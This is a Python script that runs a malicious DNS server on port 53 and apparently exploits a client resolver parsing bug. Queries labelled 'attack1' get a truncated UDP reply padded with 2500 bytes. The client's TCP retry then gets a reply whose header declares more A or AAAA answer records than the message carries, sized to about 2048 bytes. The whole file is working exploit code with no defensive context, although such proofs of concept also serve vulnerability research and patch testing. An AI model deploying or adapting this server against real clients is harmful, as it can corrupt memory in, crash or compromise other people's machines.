#!/usr/bin/env python3

import socket
import struct
import threading
import time

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


attack1_state = {}


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)


def attack1_udp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]
    padding = b"\x00" * 2500

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    message = DNSMessage(header, [question], [], [], [])
    return message.bytes() + padding


def attack1_tcp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    namelen = len(request.questions[0].bytes()) - 4
    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 2048 // (namelen + 14)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 13, 4, bytes([i]*4)))

    # Type AAAA reply
    if rtype == 28:
        ancount = 2048 // (namelen + 26)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 13, 16, bytes([i]*16)))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    message = DNSMessage(header, [question], [], [], [])
    return message.bytes()


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    while True:
        data, addr = sock.recvfrom(1024)
        print("[UDP] Datagram from {0}".format(addr[0]))

        # Parse DNS request
        tmp, request = DNSParser.parse_message(data)
        print("[UDP] {} bytes in: {}".format(len(data), request.header))

        # Execute selected attack
        if request.questions and request.questions[0].labels[0] == b"attack1":
            if addr[0] not in attack1_state:
                print("[attack1] Sending UDP reply #1 against {0}".format(addr[0]))
                data = attack1_udp(request)
                sock.sendto(data, addr)
                attack1_state[addr[0]] = threading.Event()
            else:
                try:
                    attack1_state[addr[0]].wait(2.0)
                except:
                    print("[attack1] Timed out waiting for TCP from {0}".format(addr[0]))
                    attack1_state.pop(addr[0], None)
                    continue

                print("[attack1] Sending UDP reply #2 against {0}".format(addr[0]))
                data = attack1_udp(request)
                sock.sendto(data, addr)



def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    while True:
        conn, addr = sock.accept()
        print("[TCP] Connection from {0}".format(addr[0]))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                print("[TCP] Disconnected from {0}".format(addr[0]))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            print("[TCP] {} bytes in: {}".format(len(data), request))

            # Execute selected attack
            if request.questions and request.questions[0].labels[0] == b"attack1":
                if addr[0] in attack1_state:
                    attack1_state[addr[0]].set()
                    time.sleep(0.2)
                    print("[attack1] Sending TCP reply against {0}".format(addr[0]))
                    data = attack1_tcp(request)
                    conn.sendall(dw(len(data)) + data)
                    attack1_state.pop(addr[0], None)


if __name__ == "__main__":

    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            print("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            print("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

